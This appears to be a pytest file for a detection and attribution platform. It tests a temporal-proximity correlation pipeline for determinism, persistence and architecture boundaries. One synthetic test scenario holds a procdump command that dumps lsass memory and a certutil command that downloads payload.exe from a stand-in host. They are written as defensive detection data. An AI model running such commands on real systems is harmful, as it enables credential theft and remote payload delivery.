"""Tests for gate G2.4.3: TEMPORAL_PROXIMITY replay + persistence + sequence
non-interference.

Covers: the real end-to-end pipeline
(``replay_fixture_through_correlation`` -> ``compute_temporal_proximity`` ->
G2.3 persistence, reused -> ``construct_behavioral_sequence`` -> G2.4.2
persistence, reused) against the real golden corpus and against small
in-Python-constructed scenarios; the central G2.4.3 sequence-isolation
proof (``BehavioralSequence.edges``/``.gaps``/``.parallel_groups`` are
byte-identical between the G2.4.2 baseline and the G2.4.3-enriched replay
of the *same* fixture, and the temporal-proximity link appears only in
``BehavioralStep.contextual_annotations``); persistence round-trip for the
enriched ``CorrelationGroup`` and the resulting ``BehavioralSequence``
(both via unmodified G2.3/G2.4.2 persistence functions); idempotent replay;
replay determinism; and architecture guards (no direct construction of
``CorrelationLink``/``CorrelationGroup``/``BehavioralSequence``/
``BehavioralStep``/``SequenceEdge``/``SequenceGap``/``SequenceParallelGroup``/
``Evidence``, no catching of ``CorrelationError``/``Exception``/
``BaseException``, no ``attack_knowledge`` import).

Does NOT modify fixtures/phase2_correlation_scenarios.json,
correlation_pipeline.py, or behavioral_sequence_pipeline.py. Offline,
deterministic.
"""

from __future__ import annotations

import ast
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import NoReturn

import pytest

from attribution_platform.attack_knowledge.loader import AttackKnowledge, load_attack_knowledge
from attribution_platform.correlation import CorrelationError, TemporalProximityConfig
from attribution_platform.dataplane import (
    ElasticIntegrationError,
    FakeElasticClient,
    load_behavioral_sequence,
    load_correlation_group,
    persist_behavioral_sequence,
)
from attribution_platform.detection import DetectionEngine, RulePack, load_rule_pack
from attribution_platform.domain import EventMetadata, HostRef, ProcessRef
from attribution_platform.replay import (
    DetectionReplayFixture,
    DetectionReplayScenario,
    TemporalProximityReplayResult,
    load_detection_replay_fixture_file,
    replay_fixture_through_behavioral_sequences,
    replay_fixture_through_correlation,
    replay_fixture_through_temporal_proximity,
)
from attribution_platform.sources.synthetic import SyntheticRecord

REPO_ROOT = Path(__file__).resolve().parents[1]
#: The fixture rule packs, Phase-0 scenarios and calibration corpus v1 used here are
#: frozen against this ATT&CK release (doc 11 §0 upgrade record); they load it by name.
FIXTURE_ATTACK_KB = "enterprise-attack-19.0"
FIXTURE_PATH = REPO_ROOT / "fixtures" / "phase2_correlation_scenarios.json"
RULE_PACK_PATH = REPO_ROOT / "fixtures" / "phase1_core_rules.json"
TEMPORAL_PROXIMITY_PIPELINE_FILE = (
    REPO_ROOT / "src" / "attribution_platform" / "replay" / "temporal_proximity_pipeline.py"
)

T0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)
DEFAULT_CONFIG = TemporalProximityConfig(window=timedelta(minutes=2))


@pytest.fixture(scope="module")
def knowledge() -> AttackKnowledge:
    return load_attack_knowledge(FIXTURE_ATTACK_KB)


@pytest.fixture()
def rule_pack(knowledge: AttackKnowledge) -> RulePack:
    return load_rule_pack(RULE_PACK_PATH, knowledge=knowledge)


@pytest.fixture()
def engine(rule_pack: RulePack) -> DetectionEngine:
    return DetectionEngine(rules=rule_pack.rules)


def _replay(
    engine: DetectionEngine,
    knowledge: AttackKnowledge,
    *,
    config: TemporalProximityConfig = DEFAULT_CONFIG,
) -> TemporalProximityReplayResult:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    return replay_fixture_through_temporal_proximity(
        fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge, config=config
    )


# ===========================================================================
# 1. Golden-corpus replay: sanity + corpus-wide shape
# ===========================================================================


def test_replay_produces_links_enriched_groups_and_sequences(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    assert len(result.temporal_proximity_links) > 0
    assert len(result.enriched_groups) == 21  # same 21 groups G2.3/G2.4.2 already pin
    assert len(result.sequences) == 21
    assert len(result.temporal_proximity_link_persists) == len(result.temporal_proximity_links)
    assert len(result.group_persists) == len(result.enriched_groups)
    assert len(result.sequence_persists) == len(result.sequences)


def test_enriched_groups_preserve_group_id_members_structural_links_provenance(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    baseline = _baseline_groups(fixture, engine, knowledge)
    result = _replay(engine, knowledge)
    baseline_by_id = {g.group_id: g for g in baseline}
    for group in result.enriched_groups:
        original = baseline_by_id[group.group_id]
        assert group.member_evidence_ids == original.member_evidence_ids
        assert group.member_observation_ids == original.member_observation_ids
        assert group.structural_link_ids == original.structural_link_ids
        assert group.provenance == original.provenance
        # union, never replacement
        assert set(original.contextual_link_ids) <= set(group.contextual_link_ids)


def _baseline_groups(fixture, engine: DetectionEngine, knowledge: AttackKnowledge):  # type: ignore[no-untyped-def]
    result = replay_fixture_through_correlation(
        fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge
    )
    return result.contextual_result.groups


# ===========================================================================
# 2. Sequence isolation: the central G2.4.3 proof
# ===========================================================================


def test_edges_gaps_parallel_groups_unchanged_by_enrichment(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    baseline = replay_fixture_through_behavioral_sequences(
        fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge
    )
    enriched = replay_fixture_through_temporal_proximity(
        fixture,
        client=FakeElasticClient(),
        engine=engine,
        knowledge=knowledge,
        config=DEFAULT_CONFIG,
    )

    base_by_group = {s.group_id: s for s in baseline.sequences}
    enr_by_group = {s.group_id: s for s in enriched.sequences}
    assert set(base_by_group) == set(enr_by_group)
    for group_id in base_by_group:
        assert base_by_group[group_id].edges == enr_by_group[group_id].edges
        assert base_by_group[group_id].gaps == enr_by_group[group_id].gaps
        assert base_by_group[group_id].parallel_groups == enr_by_group[group_id].parallel_groups


def test_temporal_proximity_link_appears_only_in_contextual_annotations(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    temporal_ids = {link.link_id for link in result.temporal_proximity_links}
    assert temporal_ids  # corpus timestamps span ~28 minutes, 2-minute window matches plenty

    found_annotation = False
    for sequence in result.sequences:
        # never grounds an edge
        assert all(edge.basis.grounding_link_id not in temporal_ids for edge in sequence.edges)
        # never grounds a gap
        assert all(gap.grounding_link_id not in temporal_ids for gap in sequence.gaps)
        for step in sequence.steps:
            if set(step.contextual_annotations) & temporal_ids:
                found_annotation = True
    assert found_annotation


# ===========================================================================
# 3. Persistence round trip
# ===========================================================================


def test_enriched_group_round_trips(engine: DetectionEngine, knowledge: AttackKnowledge) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    client = FakeElasticClient()
    result = replay_fixture_through_temporal_proximity(
        fixture, client=client, engine=engine, knowledge=knowledge, config=DEFAULT_CONFIG
    )
    for group in result.enriched_groups:
        assert load_correlation_group(client, group.group_id) == group


def test_sequence_round_trips(engine: DetectionEngine, knowledge: AttackKnowledge) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    client = FakeElasticClient()
    result = replay_fixture_through_temporal_proximity(
        fixture, client=client, engine=engine, knowledge=knowledge, config=DEFAULT_CONFIG
    )
    for sequence in result.sequences:
        assert load_behavioral_sequence(client, sequence.sequence_id) == sequence


# ===========================================================================
# 4. Idempotent replay + determinism
# ===========================================================================


def test_replaying_twice_into_one_client_is_idempotent(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    client = FakeElasticClient()

    first = replay_fixture_through_temporal_proximity(
        fixture, client=client, engine=engine, knowledge=knowledge, config=DEFAULT_CONFIG
    )
    second = replay_fixture_through_temporal_proximity(
        fixture, client=client, engine=engine, knowledge=knowledge, config=DEFAULT_CONFIG
    )

    assert {link.link_id for link in first.temporal_proximity_links} == {
        link.link_id for link in second.temporal_proximity_links
    }
    assert {g.group_id for g in first.enriched_groups} == {
        g.group_id for g in second.enriched_groups
    }
    assert {s.sequence_id for s in first.sequences} == {s.sequence_id for s in second.sequences}
    # no document duplication: enriched groups replace, not accumulate
    assert first.enriched_groups == second.enriched_groups
    assert first.sequences == second.sequences


def test_replay_is_deterministic_across_independent_runs(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result_a = _replay(engine, knowledge)
    result_b = _replay(engine, knowledge)
    assert [link.link_id for link in result_a.temporal_proximity_links] == [
        link.link_id for link in result_b.temporal_proximity_links
    ]
    assert [g.group_id for g in result_a.enriched_groups] == [
        g.group_id for g in result_b.enriched_groups
    ]
    assert [s.sequence_id for s in result_a.sequences] == [
        s.sequence_id for s in result_b.sequences
    ]


# ===========================================================================
# 5. Failure propagation
# ===========================================================================


def test_correlation_error_from_construct_behavioral_sequence_propagates_uncaught(
    engine: DetectionEngine, knowledge: AttackKnowledge, monkeypatch: pytest.MonkeyPatch
) -> None:
    def failing_construct(*args: object, **kwargs: object) -> NoReturn:
        raise CorrelationError("injected construct_behavioral_sequence failure")

    monkeypatch.setattr(
        "attribution_platform.replay.temporal_proximity_pipeline.construct_behavioral_sequence",
        failing_construct,
    )

    """Reproduces the G2.4.1-audited multi-link-grounding ambiguity through
    the full real pipeline (real rule pack, hand-built-in-Python
    DetectionReplayFixture, never touching the shared JSON corpus) and
    confirms it is never caught/suppressed by this new pipeline either."""
    scenarios = (
        DetectionReplayScenario(
            scenario_id="amb-parent",
            raw_record=SyntheticRecord(
                record_id="evt-amb-parent", timestamp=T0, observation_id="obs-amb-parent"
            ),
            process=ProcessRef(
                name="procdump.exe",
                command_line="procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
                entity_id="{AMB-P}",
            ),
            event=EventMetadata(action="user-logon"),
            host=HostRef(id="HOST-AMB"),
        ),
        DetectionReplayScenario(
            scenario_id="amb-child",
            raw_record=SyntheticRecord(
                record_id="evt-amb-child",
                timestamp=T0.replace(second=1),
                observation_id="obs-amb-child",
            ),
            process=ProcessRef(
                name="certutil.exe",
                command_line=(
                    "certutil.exe -urlcache -split -f "
                    "http://example.invalid/payload.exe payload.exe"
                ),
                parent_entity_id="{AMB-P}",
                entity_id="{AMB-C}",
            ),
            host=HostRef(id="HOST-AMB"),
        ),
    )
    fixture = DetectionReplayFixture(
        fixture_id="g2.4.3-ambiguity-probe", content_hash="0" * 64, scenarios=scenarios
    )
    client = FakeElasticClient()

    with pytest.raises(CorrelationError, match="injected"):
        replay_fixture_through_temporal_proximity(
            fixture, client=client, engine=engine, knowledge=knowledge, config=DEFAULT_CONFIG
        )


def test_persist_behavioral_sequence_still_rejects_non_sequence() -> None:
    """Sanity: G2.4.2 persistence is reused unmodified -- its own fail-closed
    behavior is untouched by this gate."""
    client = FakeElasticClient()
    with pytest.raises(ElasticIntegrationError, match="requires a BehavioralSequence"):
        persist_behavioral_sequence(client, {"sequence_id": "x"})  # type: ignore[arg-type]


# ===========================================================================
# 6. Architecture-boundary guards
# ===========================================================================


def test_pipeline_never_constructs_forbidden_objects_directly() -> None:
    tree = ast.parse(TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8"))
    forbidden_calls = {
        "CorrelationLink",
        "CorrelationGroup",
        "BehavioralSequence",
        "BehavioralStep",
        "SequenceEdge",
        "SequenceGap",
        "SequenceParallelGroup",
        "Evidence",
    }
    offending = [
        node.func.id
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id in forbidden_calls
    ]
    assert not offending, (
        f"temporal_proximity_pipeline.py must not construct {offending} directly; every one "
        "must come from the real replay_fixture_through_correlation/compute_temporal_proximity/"
        "construct_behavioral_sequence calls"
    )


def test_pipeline_actually_uses_the_real_functions() -> None:
    source = TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8")
    assert "replay_fixture_through_correlation(" in source
    assert "compute_temporal_proximity(" in source
    assert "persist_correlation_link(" in source
    assert "persist_correlation_group(" in source
    assert "construct_behavioral_sequence(" in source
    assert "persist_behavioral_sequence(" in source


def test_pipeline_never_catches_correlation_error() -> None:
    tree = ast.parse(TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.Try):
            for handler in node.handlers:
                if handler.type is None:
                    pytest.fail("temporal_proximity_pipeline.py must not use a bare except")
                names = [n.id for n in ast.walk(handler.type) if isinstance(n, ast.Name)]
                assert "CorrelationError" not in names
                assert "Exception" not in names
                assert "BaseException" not in names


def test_pipeline_never_imports_attack_knowledge_module_directly() -> None:
    tree = ast.parse(TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module:
            assert node.module != "attribution_platform.attack_knowledge"


def test_pipeline_never_passes_attack_knowledge_into_correlation_or_temporal_proximity() -> None:
    tree = ast.parse(TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id in ("compute_temporal_proximity",)
        ):
            kwarg_names = {kw.arg for kw in node.keywords}
            assert "knowledge" not in kwarg_names


def test_pipeline_does_not_call_replay_fixture_through_behavioral_sequences() -> None:
    """Locks the design decision: this pipeline reuses the lower-level
    functions directly rather than the G2.4.2 orchestrator, which has no
    temporal-enrichment injection point."""
    source = TEMPORAL_PROXIMITY_PIPELINE_FILE.read_text(encoding="utf-8")
    assert "replay_fixture_through_behavioral_sequences(" not in source
